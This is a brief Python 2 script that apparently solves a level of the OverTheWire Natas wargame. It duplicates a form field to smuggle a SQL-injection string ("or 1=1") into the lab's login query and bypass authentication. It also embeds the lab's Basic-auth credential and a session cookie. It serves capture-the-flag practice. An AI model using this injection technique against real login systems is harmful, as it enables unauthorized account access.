#!/usr/bin/python
import urllib
import urllib2
import binascii


# 
def request_generate(URL, *args, **kwargs):
    req = urllib2.Request(URL, *args, **kwargs)
    req.add_header('User-Agent',  ' i dont want to tell you!!! :) ')
    req.add_header('Authorization', 'Basic bmF0YXMzMDp3aWU5aWV4YWUwRGFpaG9odjh2dXUzY2VpOXdhaGYwZQ==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174; PHPSESSID={};')
    return urllib2.urlopen(req)


# main function
def main():
    URL = 'http://natas30.natas.labs.overthewire.org/index.pl'
    DATA = {'username':'natas31', "password1":"'nothingimportant' or 1=1", "password":"2"}
    DATA = urllib.urlencode(DATA)
    DATA = DATA.replace("password1", "password")
    print DATA
    v = request_generate(URL, data=DATA)
    print v.read()
    return


if __name__=='__main__':
    main()
